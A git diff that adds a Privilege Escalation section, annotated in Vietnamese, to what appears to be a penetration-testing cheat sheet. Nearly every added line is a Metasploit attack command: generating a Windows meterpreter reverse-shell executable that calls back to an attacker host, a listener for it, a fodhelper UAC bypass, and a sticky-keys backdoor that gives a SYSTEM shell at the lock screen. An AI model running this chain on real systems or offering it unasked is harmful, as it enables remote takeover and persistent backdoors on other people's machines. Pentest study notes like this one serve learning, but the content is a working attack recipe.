@@ -171,6 +171,36 @@ john --format=NT hashes.txt
 ```
 # Privilege Escalation
 ```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ipattacker> LPORT=4444 -f exe > Windows.exe (tạo file reverse)
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ipattacker>
+set LPORT 4444
+run
+
+background												(để quay lại)
+search bypassuac
+use exploit/windows/local/bypassuac_fodhelper
+set session 1
+show option
+
+set LHOST <ipattacker>
+set TARGET 0
+exploit
+
+background
+use post/windows/manage/sticky_keys						(khai thác dù khóa màn hình vẫn cmd đc)
+sessions -i*
+set session 2 											( chọn session nào là system)
+
+
+-----------------------------------------------------------------------------------------------------------------
+
+msfvenom -p windows/meterpreter/reverse_tcp lhost=<ipattacker> lport=444 -f exe > /home/attacker/Desktop/Test.exe
+
+
 
 ```
 #  Some extra work 
